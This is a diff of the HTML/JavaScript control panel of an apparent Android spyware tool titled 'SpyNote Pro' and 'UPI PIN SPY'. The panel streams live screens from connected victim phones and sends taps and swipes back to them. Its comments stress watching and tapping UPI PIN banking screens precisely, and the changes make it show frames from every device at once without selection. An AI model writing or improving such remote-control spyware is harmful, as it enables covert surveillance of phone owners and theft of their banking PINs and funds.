@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Pro - UPI PIN Banking Layout LIVE</title>
+    <title>📱 UPI PIN SPY - Banking Layouts LIVE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
@@ -56,16 +56,10 @@
             box-shadow: 0 8px 25px rgba(0,255,136,0.4);
         }
         button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
-        #loading { 
+        #waiting { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); 
             font-size: 18px; color: #00ff88; display: none; text-align: center;
         }
-        .spinner { 
-            border: 3px solid rgba(0,255,136,0.3); border-top: 3px solid #00ff88; 
-            border-radius: 50%; width: 40px; height: 40px; 
-            animation: spin 0.8s linear infinite; margin: 0 auto 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -77,16 +71,16 @@
     <div id="status-bar">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
         <div id="fps-counter">FPS: -- | Device: --</div>
-        <div>🏦 UPI Layout: <span id="layoutStatus">Waiting...</span></div>
+        <div id="layoutStatus">UPI Layout: Waiting...</div>
     </div>
 
     <div id="phone-container">
         <canvas id="screen"></canvas>
     </div>
 
-    <div id="loading">
-        <div class="spinner"></div>
-        Instant banking layouts...
+    <div id="waiting">
+        <div style="font-size: 24px; margin-bottom: 10px;">🎯</div>
+        UPI PIN Layouts Coming...
     </div>
 
     <div id="controls">
@@ -97,12 +91,12 @@
     <script>
         const socket = io({ 
             transports: ['websocket'], upgrade: false,
-            timeout: 3000, reconnection: true, reconnectionAttempts: 10
+            timeout: 5000, reconnection: true, reconnectionAttempts: 20
         });
         
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 2400;
-        let frameCount = 0, lastFrameTime = 0, framesReceived = 0;
+        let frameCount = 0, lastFrameTime = 0, totalFrames = 0;
         let isDragging = false, dragStart = { x: 0, y: 0 };
         
         const canvas = document.getElementById('screen');
@@ -112,28 +106,27 @@
         const connectionStatus = document.getElementById('connectionStatus');
         const fpsCounter = document.getElementById('fps-counter');
         const layoutStatus = document.getElementById('layoutStatus');
-        const loading = document.getElementById('loading');
+        const waiting = document.getElementById('waiting');
 
-        // 🔥 AUTO JOIN GLOBAL ROOM
         socket.on('connect', () => {
-            console.log('✅ Socket LIVE - Ready for banking layouts!');
+            console.log('✅ SOCKET LIVE!');
             connectionStatus.textContent = '✅ LIVE';
             connectionStatus.style.color = '#00ff88';
             fetchDevices();
         });
 
-        // 🔥 SHOW ALL FRAMES FROM ANY DEVICE (INSTANT!)
+        // 🔥 SHOW ALL FRAMES FROM ALL DEVICES (NO SELECT NEEDED!)
         socket.on('screen-frame', (data) => {
-            framesReceived++;
-            console.log(`📱 Frame #${framesReceived} (${data.width}x${data.height}) from ${data.deviceId?.slice(0,8)}`);
+            totalFrames++;
+            console.log(`📱 Frame #${totalFrames} (${data.width}x${data.height}) → ${data.deviceId.slice(0,8)}`);
             
             if (data.width && data.height) {
                 deviceWidth = data.width;
                 deviceHeight = data.height;
-                currentDevice = data.deviceId;
+                currentDevice = data.deviceId; // AUTO SELECT
                 
-                // 🔥 INSTANT SHOW - NO WAITING!
-                loading.style.display = 'none';
+                // 🔥 INSTANT HIDE WAITING
+                waiting.style.display = 'none';
                 layoutStatus.textContent = '✅ UPI PIN LAYOUT LIVE';
                 layoutStatus.style.color = '#00ff88';
                 
@@ -141,7 +134,7 @@
             }
         });
 
-        // 🔥 ULTRA FAST CANVAS (UPI PIN Precise!)
+        // 🔥 ULTRA PRECISE UPI PIN RENDERING
         function renderFrame(data) {
             const img = new Image();
             img.onload = () => {
@@ -149,10 +142,8 @@
                 canvas.width = rect.width;
                 canvas.height = rect.height;
                 
-                // 🔥 SHARP PIXELS (Banking text clear)
+                // 🔥 SHARP PIXELS FOR UPI BUTTONS
                 ctx.imageSmoothingEnabled = false;
-                ctx.mozImageSmoothingEnabled = false;
-                ctx.webkitImageSmoothingEnabled = false;
                 ctx.drawImage(img, 0, 0, rect.width, rect.height);
                 
                 // FPS
@@ -168,7 +159,7 @@
             img.src = 'data:image/jpeg;base64,' + data.data;
         }
 
-        // 🔥 PRECISE UPI PIN CONTROLS
+        // 🔥 PERFECT UPI PIN COORDINATES
         function getScaledCoords(clientX, clientY) {
             const rect = phoneContainer.getBoundingClientRect();
             const scaleX = deviceWidth / rect.width;
@@ -179,7 +170,7 @@
             };
         }
 
-        // Touch + Mouse (Perfect UPI PIN tapping)
+        // 🔥 TOUCH + MOUSE (UPI PIN Perfect!)
         ['mousedown', 'touchstart'].forEach(ev => 
             phoneContainer.addEventListener(ev, startTouch, { passive: false })
         );
@@ -223,14 +214,12 @@
             if (startX !== undefined) { data.startX = startX; data.startY = startY; }
             if (endX !== undefined) { data.endX = endX; data.endY = endY; }
             socket.emit('control', data);
+            console.log(`🎮 ${action} → (${x?.toFixed(0)},${y?.toFixed(0)})`);
         }
 
         function fetchDevices() {
             fetch('/devices').then(r => r.json()).then(devices => {
                 updateDeviceList(devices);
-                if (devices.length > 0 && !currentDevice) {
-                    selectDevice(devices[0][0]);
-                }
             });
         }
 
@@ -249,7 +238,7 @@
             currentDevice = deviceId;
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
-            socket.emit('select-device', { deviceId });
+            console.log('🎯 SELECTED:', deviceId);
         }
 
         function sendBack() {
@@ -260,10 +249,10 @@
             document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
         }
 
-        // 🔥 Debug console
+        // 🔥 DEBUG CONSOLE
         setInterval(() => {
-            console.log(`📊 Frames: ${framesReceived}, Device: ${currentDevice?.slice(0,8)}`);
-        }, 3000);
+            console.log(`📊 Total Frames: ${totalFrames} | Active: ${currentDevice?.slice(0,8) || 'None'}`);
+        }, 5000);
     </script>
 </body>
 </html>
